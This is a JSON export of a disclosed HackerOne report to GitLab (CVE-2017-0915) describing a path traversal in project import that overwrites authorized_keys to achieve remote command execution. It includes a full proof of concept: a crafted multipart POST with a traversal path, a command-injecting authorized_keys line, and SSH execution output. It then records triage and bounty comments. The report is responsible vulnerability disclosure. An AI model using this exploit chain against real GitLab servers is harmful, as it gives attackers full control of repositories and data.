{"id":298873,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTg4NzM=","url":"https://hackerone.com/reports/298873","title":"Command injection by overwriting authorized_keys file through GitLab import","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2017-12-17T03:11:21.852Z","submitted_at":"2017-12-17T03:11:21.852Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jobert","url":"/jobert","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":264,"url":"https://hackerone.com/gitlab","handle":"gitlab","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"GitLab","twitter_handle":"gitlab","website":"https://about.gitlab.com","about":"A single application for the entire software development lifecycle."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2017-0915"],"singular_disclosure_disabled":true,"disclosed_at":"2018-04-27T02:20:49.927Z","bug_reporter_agreed_on_going_public_at":"2018-04-25T23:41:20.996Z","team_member_agreed_on_going_public_at":"2018-04-27T02:20:49.842Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"The `Projects::GitlabProjectsImportService` contains a vulnerability that allows an attacker to write files to arbitrary directories on the server. This leads to an arbitrary command execution vulnerability by overwriting the `authorized_keys` file. To reproduce, sign in to a GitLab instance that has GitLab import enabled. This is enabled by default, so I'd assume that this vulnerability applies to most GitLab instances. I've installed my GitLab instance through Omnibus.\n\nNext up, intercept your network traffic and upload a GitLab import file. Observe the following request being made to the server:\n\n**Request**\n```\nPOST /import/gitlab_project HTTP/1.1\nHost: gitlab-instance\n...\n\n------WebKitFormBoundaryA0TxBpQRLhL4lJQN\nContent-Disposition: form-data; name=\"path\"\ntest\n------WebKitFormBoundaryA0TxBpQRLhL4lJQN\nContent-Disposition: form-data; name=\"namespace_id\"\n\n1\n------WebKitFormBoundaryA0TxBpQRLhL4lJQN\nContent-Disposition: form-data; name=\"file\"; filename=\"2017-12-17_02-20-093_root_test_export.tar.gz\"\nContent-Type: application/x-gzip\n\n\u003cfile data\u003e\n```\n\nNow take a closer look at the code that is being executed when this endpoint is hit:\n\n**app/services/projects/gitlab_project_import_service.rb**\n```ruby\n# This service is an adapter used to for the GitLab Import feature, and\n# creating a project from a template.\n# The latter will under the hood just import an archive supplied by GitLab.\nmodule Projects\n  class GitlabProjectsImportService\n    # ...\n\n    def execute\n      FileUtils.mkdir_p(File.dirname(import_upload_path))\n      FileUtils.copy_entry(file.path, import_upload_path)\n\n      Gitlab::ImportExport::ProjectCreator.new(params[:namespace_id],\n                                               current_user,\n                                               import_upload_path,\n                                               params[:path]).execute\n    end\n\n    # ...\n\n    def tmp_filename\n      \"#{SecureRandom.hex}_#{params[:path]}\"\n    end\n  end\nend\n```\n\nThe `import_upload_path` will take the unsanitized `params[:path]` and append it to the GitLab uploads directory. This means that directories can be traversed in the `path` parameter. Another observation is that the file contents of the `file` aren't verified. This means that it may contain any data at that point.\n\nMy first though was to abuse this vulnerability to exploit a second-order remote code execution by writing an ERB template to the Rails views directory. However, that didn't work because of the file permissions of the GitLab Rails directory. I started looking for other files. I noticed that the uploads directory was writable for the `git` user. I took a closer look at the `/var/opt/gitlab/` directory and noticed the `.ssh/authorized_keys` directory. This file was writable for the `git` user, and thus, could be overwritten. This file can specify a command when an SSH connection is made. Now, going back to the original HTTP request, here's the updated request to overwrite the file:\n\n```\nPOST /import/gitlab_project HTTP/1.1\nHost: gitlab-instance\n...\n\n------WebKitFormBoundaryA0TxBpQRLhL4lJQN\nContent-Disposition: form-data; name=\"path\"\n\nnew-test/../../../../../../../../../var/opt/gitlab/.ssh/authorized_keys\n------WebKitFormBoundaryA0TxBpQRLhL4lJQN\nContent-Disposition: form-data; name=\"namespace_id\"\n\n1\n------WebKitFormBoundaryA0TxBpQRLhL4lJQN\nContent-Disposition: form-data; name=\"file\"; filename=\"2017-12-17_02-20-093_root_test_export.tar.gz\"\nContent-Type: application/x-gzip\n\ncommand=\"ls -lash\",no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCxc6GwCNoYCygtTXvoBpn1ACoF4hxhQviNa/0fm3LGGnEWLszswgw4QcaxXYiRumKjBv77eJT2/VbJylZX0uL6D/1/hubTmnp2A1QQJLk1rMvaUGlR8DeQpIcF1T61g3y4lEw5yhaaHRqRLiMpGammQhu0PO6PTDbKlGH+HxA0u8ku/L+lJXncNtpupw3qTDaAt8dgamKAU8RSZRyANK2BVYVj1W376OQFglHIeQW62LsNNgvr9Oe/Ze1YeQqvHO/lv0AeWYdLgjBJOiC5acBFexDBCr4odeSqkDPmKCMI28Mw28hC8fJIHh3vFqXjvlPtkuhDmdap4x+8gUxP77DWoMGw6LY8cuce+sSWY0teawMFW8Dm2R0Fr2iHzpCT8IpKgVHQ24BnmPGWjtWHxDX2DSzdE3GC6dWStVXud3iprgipM2SOxFkwHIISzLybjT1u/fK1sO4IW6E2T1cgSYQd7I2KhNJsgW57GljefD4cmhlwR39ZXZ1GtDCoUxtwZF3Qpr6XaSQ4nL71Wq+Y+v2TGeJzI9HXHRUSP2gZh/BI5kUdeUKkeylhLLouCqII5MlIlMmklXFOOPXoip/KCO36fYRZ1YAhxJ0J1JGX7ws4BnMMKHAHp+YOtRpAfGXcA+yEdMx50PRvXydqNeivfvDlY2JXRRIKUA03O9GoWmPLpQ==\n------WebKitFormBoundaryA0TxBpQRLhL4lJQN--\n```\n\nIn the request, replace my public SSH key with your own and replace `ls -lash` with whatever command you want to execute. When the request is sent to the server, a 302 Found will be returned. This is caused by a validation error that is returned because the project name contains invalid characters. Because the files aren't cleaned up, our exploit persists.\n\n**Response**\n```\nHTTP/1.1 302 Found\nServer: nginx\n...\nLocation: http:/gitlab-instance/import/gitlab_project/new?namespace_id=1\u0026path=new-test/../../../../../../../../../var/opt/gitlab/.ssh/authorized_keys\n...\n```\n\nNow, to execute the command, run `ssh git@gitlab-instance`:\n\n```\n$ ssh git@gitlab-instance\nPTY allocation request failed on channel 0\ntotal 84K\n4.0K drwxr-xr-x 18 root              root       4.0K Dec 15 04:33 .\n4.0K drwxr-xr-x  3 root              root       4.0K Dec 15 04:32 ..\n4.0K drwx------  2 git               root       4.0K Dec 15 04:32 backups\n4.0K -rw-------  1 root              root         38 Dec 15 04:33 bootstrapped\n4.0K drwx------  2 git               root       4.0K Dec 17 02:28 gitaly\n4.0K -rw-r--r--  1 git               git         292 Dec 15 04:32 .gitconfig\n4.0K drwx------  3 git               root       4.0K Dec 15 04:32 git-data\n4.0K drwxr-xr-x  3 git               root       4.0K Dec 15 04:32 gitlab-ci\n4.0K drwxr-xr-x  2 git               root       4.0K Dec 15 04:33 gitlab-monitor\n4.0K drwxr-xr-x  9 git               root       4.0K Dec 15 04:33 gitlab-rails\n4.0K drwx------  2 git               root       4.0K Dec 15 04:32 gitlab-shell\n4.0K drwxr-x---  2 git               gitlab-www 4.0K Dec 17 02:28 gitlab-workhorse\n4.0K drwx------  3 root              root       4.0K Dec 17 02:38 logrotate\n4.0K drwxr-x---  9 root              gitlab-www 4.0K Dec 17 02:28 nginx\n4.0K drwxr-xr-x  3 root              root       4.0K Dec 15 04:33 node-exporter\n4.0K drwx------  2 gitlab-psql       root       4.0K Dec 15 04:34 postgres-exporter\n4.0K drwxr-xr-x  3 gitlab-psql       root       4.0K Dec 17 02:28 postgresql\n4.0K drwxr-x---  3 gitlab-prometheus root       4.0K Dec 15 04:33 prometheus\n4.0K drwxr-x---  2 gitlab-redis      git        4.0K Dec 17 02:43 redis\n4.0K drwx------  2 git               git        4.0K Dec 17 02:44 .ssh\n4.0K -rw-r--r--  1 root              root         40 Dec 15 04:32 trusted-certs-directory-hash\n```\n\nThis has been tested against GitLab 10.2.4 (the latest version, also used on gitlab.com).\n\n## Impact\n\nAn attacker can execute arbitrary system commands on the server, which exposes access to all git repositories, database, and potentially other secrets that may be used to escalate this further.","vulnerability_information_html":"\u003cp\u003eThe \u003ccode\u003eProjects::GitlabProjectsImportService\u003c/code\u003e contains a vulnerability that allows an attacker to write files to arbitrary directories on the server. This leads to an arbitrary command execution vulnerability by overwriting the \u003ccode\u003eauthorized_keys\u003c/code\u003e file. To reproduce, sign in to a GitLab instance that has GitLab import enabled. This is enabled by default, so I\u0026#39;d assume that this vulnerability applies to most GitLab instances. I\u0026#39;ve installed my GitLab instance through Omnibus.\u003c/p\u003e\n\n\u003cp\u003eNext up, intercept your network traffic and upload a GitLab import file. Observe the following request being made to the server:\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eRequest\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /import/gitlab_project HTTP/1.1\nHost: gitlab-instance\n...\n\n------WebKitFormBoundaryA0TxBpQRLhL4lJQN\nContent-Disposition: form-data; name=\u0026quot;path\u0026quot;\ntest\n------WebKitFormBoundaryA0TxBpQRLhL4lJQN\nContent-Disposition: form-data; name=\u0026quot;namespace_id\u0026quot;\n\n1\n------WebKitFormBoundaryA0TxBpQRLhL4lJQN\nContent-Disposition: form-data; name=\u0026quot;file\u0026quot;; filename=\u0026quot;2017-12-17_02-20-093_root_test_export.tar.gz\u0026quot;\nContent-Type: application/x-gzip\n\n\u0026lt;file data\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNow take a closer look at the code that is being executed when this endpoint is hit:\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eapp/services/projects/gitlab_project_import_service.rb\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e# This service is an adapter used to for the GitLab Import feature, and\u003c/span\u003e\n\u003cspan class=\"c1\"\u003e# creating a project from a template.\u003c/span\u003e\n\u003cspan class=\"c1\"\u003e# The latter will under the hood just import an archive supplied by GitLab.\u003c/span\u003e\n\u003cspan class=\"k\"\u003emodule\u003c/span\u003e \u003cspan class=\"nn\"\u003eProjects\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eclass\u003c/span\u003e \u003cspan class=\"nc\"\u003eGitlabProjectsImportService\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e# ...\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eexecute\u003c/span\u003e\n      \u003cspan class=\"no\"\u003eFileUtils\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003emkdir_p\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"no\"\u003eFile\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003edirname\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eimport_upload_path\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n      \u003cspan class=\"no\"\u003eFileUtils\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003ecopy_entry\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efile\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eimport_upload_path\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n      \u003cspan class=\"no\"\u003eGitlab\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003eImportExport\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003eProjectCreator\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003enew\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eparams\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"ss\"\u003e:namespace_id\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e\n                                               \u003cspan class=\"n\"\u003ecurrent_user\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n                                               \u003cspan class=\"n\"\u003eimport_upload_path\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n                                               \u003cspan class=\"n\"\u003eparams\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"ss\"\u003e:path\u003c/span\u003e\u003cspan class=\"p\"\u003e]).\u003c/span\u003e\u003cspan class=\"nf\"\u003eexecute\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\n    \u003cspan class=\"c1\"\u003e# ...\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003etmp_filename\u003c/span\u003e\n      \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"si\"\u003e#{\u003c/span\u003e\u003cspan class=\"no\"\u003eSecureRandom\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003ehex\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e_\u003c/span\u003e\u003cspan class=\"si\"\u003e#{\u003c/span\u003e\u003cspan class=\"n\"\u003eparams\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"ss\"\u003e:path\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe \u003ccode\u003eimport_upload_path\u003c/code\u003e will take the unsanitized \u003ccode\u003eparams[:path]\u003c/code\u003e and append it to the GitLab uploads directory. This means that directories can be traversed in the \u003ccode\u003epath\u003c/code\u003e parameter. Another observation is that the file contents of the \u003ccode\u003efile\u003c/code\u003e aren\u0026#39;t verified. This means that it may contain any data at that point.\u003c/p\u003e\n\n\u003cp\u003eMy first though was to abuse this vulnerability to exploit a second-order remote code execution by writing an ERB template to the Rails views directory. However, that didn\u0026#39;t work because of the file permissions of the GitLab Rails directory. I started looking for other files. I noticed that the uploads directory was writable for the \u003ccode\u003egit\u003c/code\u003e user. I took a closer look at the \u003ccode\u003e/var/opt/gitlab/\u003c/code\u003e directory and noticed the \u003ccode\u003e.ssh/authorized_keys\u003c/code\u003e directory. This file was writable for the \u003ccode\u003egit\u003c/code\u003e user, and thus, could be overwritten. This file can specify a command when an SSH connection is made. Now, going back to the original HTTP request, here\u0026#39;s the updated request to overwrite the file:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /import/gitlab_project HTTP/1.1\nHost: gitlab-instance\n...\n\n------WebKitFormBoundaryA0TxBpQRLhL4lJQN\nContent-Disposition: form-data; name=\u0026quot;path\u0026quot;\n\nnew-test/../../../../../../../../../var/opt/gitlab/.ssh/authorized_keys\n------WebKitFormBoundaryA0TxBpQRLhL4lJQN\nContent-Disposition: form-data; name=\u0026quot;namespace_id\u0026quot;\n\n1\n------WebKitFormBoundaryA0TxBpQRLhL4lJQN\nContent-Disposition: form-data; name=\u0026quot;file\u0026quot;; filename=\u0026quot;2017-12-17_02-20-093_root_test_export.tar.gz\u0026quot;\nContent-Type: application/x-gzip\n\ncommand=\u0026quot;ls -lash\u0026quot;,no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCxc6GwCNoYCygtTXvoBpn1ACoF4hxhQviNa/0fm3LGGnEWLszswgw4QcaxXYiRumKjBv77eJT2/VbJylZX0uL6D/1/hubTmnp2A1QQJLk1rMvaUGlR8DeQpIcF1T61g3y4lEw5yhaaHRqRLiMpGammQhu0PO6PTDbKlGH+HxA0u8ku/L+lJXncNtpupw3qTDaAt8dgamKAU8RSZRyANK2BVYVj1W376OQFglHIeQW62LsNNgvr9Oe/Ze1YeQqvHO/lv0AeWYdLgjBJOiC5acBFexDBCr4odeSqkDPmKCMI28Mw28hC8fJIHh3vFqXjvlPtkuhDmdap4x+8gUxP77DWoMGw6LY8cuce+sSWY0teawMFW8Dm2R0Fr2iHzpCT8IpKgVHQ24BnmPGWjtWHxDX2DSzdE3GC6dWStVXud3iprgipM2SOxFkwHIISzLybjT1u/fK1sO4IW6E2T1cgSYQd7I2KhNJsgW57GljefD4cmhlwR39ZXZ1GtDCoUxtwZF3Qpr6XaSQ4nL71Wq+Y+v2TGeJzI9HXHRUSP2gZh/BI5kUdeUKkeylhLLouCqII5MlIlMmklXFOOPXoip/KCO36fYRZ1YAhxJ0J1JGX7ws4BnMMKHAHp+YOtRpAfGXcA+yEdMx50PRvXydqNeivfvDlY2JXRRIKUA03O9GoWmPLpQ==\n------WebKitFormBoundaryA0TxBpQRLhL4lJQN--\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIn the request, replace my public SSH key with your own and replace \u003ccode\u003els -lash\u003c/code\u003e with whatever command you want to execute. When the request is sent to the server, a 302 Found will be returned. This is caused by a validation error that is returned because the project name contains invalid characters. Because the files aren\u0026#39;t cleaned up, our exploit persists.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eResponse\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHTTP/1.1 302 Found\nServer: nginx\n...\nLocation: http:/gitlab-instance/import/gitlab_project/new?namespace_id=1\u0026amp;path=new-test/../../../../../../../../../var/opt/gitlab/.ssh/authorized_keys\n...\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNow, to execute the command, run \u003ccode\u003essh git@gitlab-instance\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ ssh git@gitlab-instance\nPTY allocation request failed on channel 0\ntotal 84K\n4.0K drwxr-xr-x 18 root              root       4.0K Dec 15 04:33 .\n4.0K drwxr-xr-x  3 root              root       4.0K Dec 15 04:32 ..\n4.0K drwx------  2 git               root       4.0K Dec 15 04:32 backups\n4.0K -rw-------  1 root              root         38 Dec 15 04:33 bootstrapped\n4.0K drwx------  2 git               root       4.0K Dec 17 02:28 gitaly\n4.0K -rw-r--r--  1 git               git         292 Dec 15 04:32 .gitconfig\n4.0K drwx------  3 git               root       4.0K Dec 15 04:32 git-data\n4.0K drwxr-xr-x  3 git               root       4.0K Dec 15 04:32 gitlab-ci\n4.0K drwxr-xr-x  2 git               root       4.0K Dec 15 04:33 gitlab-monitor\n4.0K drwxr-xr-x  9 git               root       4.0K Dec 15 04:33 gitlab-rails\n4.0K drwx------  2 git               root       4.0K Dec 15 04:32 gitlab-shell\n4.0K drwxr-x---  2 git               gitlab-www 4.0K Dec 17 02:28 gitlab-workhorse\n4.0K drwx------  3 root              root       4.0K Dec 17 02:38 logrotate\n4.0K drwxr-x---  9 root              gitlab-www 4.0K Dec 17 02:28 nginx\n4.0K drwxr-xr-x  3 root              root       4.0K Dec 15 04:33 node-exporter\n4.0K drwx------  2 gitlab-psql       root       4.0K Dec 15 04:34 postgres-exporter\n4.0K drwxr-xr-x  3 gitlab-psql       root       4.0K Dec 17 02:28 postgresql\n4.0K drwxr-x---  3 gitlab-prometheus root       4.0K Dec 15 04:33 prometheus\n4.0K drwxr-x---  2 gitlab-redis      git        4.0K Dec 17 02:43 redis\n4.0K drwx------  2 git               git        4.0K Dec 17 02:44 .ssh\n4.0K -rw-r--r--  1 root              root         40 Dec 15 04:32 trusted-certs-directory-hash\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis has been tested against GitLab 10.2.4 (the latest version, also used on gitlab.com).\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAn attacker can execute arbitrary system commands on the server, which exposes access to all git repositories, database, and potentially other secrets that may be used to escalate this further.\u003c/p\u003e\n","bounty_amount":"2000.0","formatted_bounty":"$2,000","weakness":{"id":58,"name":"Command Injection - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2018-05-25T23:41:21.058Z","allow_singular_disclosure_after":-81927998.15504535,"singular_disclosure_allowed":true,"vote_count":48,"voters":["jokebookservice1","irvinlim","sp1d3rs","kapytein","europa","secator","jobert","bull","michiel","muon4","and 38 more..."],"severity":{"rating":"critical","score":9.9,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"none","scope":"changed","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2229765,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Jobert,\n\nThank you for highlighting and detailing this critical security vulnerability. We are now working to report this issue to our engineering team so that the report can be triaged and investigated. Based on our current investigative workload, we expect to notify you of next steps in our investigation process within the next 2-3 business days. \n\nRegards,\nGitLab Security Team","markdown_message":"\u003cp\u003eHi Jobert,\u003c/p\u003e\n\n\u003cp\u003eThank you for highlighting and detailing this critical security vulnerability. We are now working to report this issue to our engineering team so that the report can be triaged and investigated. Based on our current investigative workload, we expect to notify you of next steps in our investigation process within the next 2-3 business days. \u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nGitLab Security Team\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-17T04:08:31.487Z","updated_at":"2017-12-17T04:08:31.487Z","actor":{"username":"kathyw","cleared":false,"url":"/kathyw","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2236190,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Jobert,\n\nCongratulations! Due to your detailed findings report #298873, we were able to work with our engineering team to report/triage the security vulnerability, and our engineering team is now working on a fix for this vulnerability.\n\nWe certainly appreciate your efforts and time, and would like to reward you accordingly, with the $2000 award for a critical security vulnerability finding. Thanks again, and we look forward to hearing from you again!\n\nRegards,\nGitLab Security Team","markdown_message":"\u003cp\u003eHi Jobert,\u003c/p\u003e\n\n\u003cp\u003eCongratulations! Due to your detailed findings report \u003ca href=\"/reports/298873\"\u003e#298873\u003c/a\u003e, we were able to work with our engineering team to report/triage the security vulnerability, and our engineering team is now working on a fix for this vulnerability.\u003c/p\u003e\n\n\u003cp\u003eWe certainly appreciate your efforts and time, and would like to reward you accordingly, with the $2000 award for a critical security vulnerability finding. Thanks again, and we look forward to hearing from you again!\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nGitLab Security Team\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-19T20:59:15.322Z","updated_at":"2017-12-19T20:59:15.322Z","actor":{"username":"kathyw","cleared":false,"url":"/kathyw","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2236191,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2017-12-19T20:59:49.976Z","updated_at":"2017-12-19T20:59:49.976Z","actor":{"url":"/gitlab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"GitLab"}},"bounty_amount":"2000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"gitlab","collaborator":{"username":"jobert","url":"/jobert"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2236241,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks so much, @kathyw!","markdown_message":"\u003cp\u003eThanks so much, \u003ca href=\"/kathyw\"\u003e@kathyw\u003c/a\u003e!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-19T21:15:05.707Z","updated_at":"2017-12-19T21:15:05.707Z","actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2241826,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2017-12-22T05:22:50.860Z","updated_at":"2017-12-22T05:22:50.860Z","actor":{"username":"kathyw","cleared":false,"url":"/kathyw","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2241827,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2017-12-22T05:23:15.006Z","updated_at":"2017-12-22T05:23:15.006Z","actor":{"username":"kathyw","cleared":false,"url":"/kathyw","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"jobert","url":"/jobert"},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2665587,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-04-25T23:41:21.026Z","updated_at":"2018-04-25T23:41:21.026Z","first_to_agree":true,"actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2670830,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-04-27T02:20:49.876Z","updated_at":"2018-04-27T02:20:49.876Z","actor":{"username":"kathyw","cleared":false,"url":"/kathyw","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2670831,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-04-27T02:20:49.959Z","updated_at":"2018-04-27T02:20:49.959Z","actor":{"username":"kathyw","cleared":false,"url":"/kathyw","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}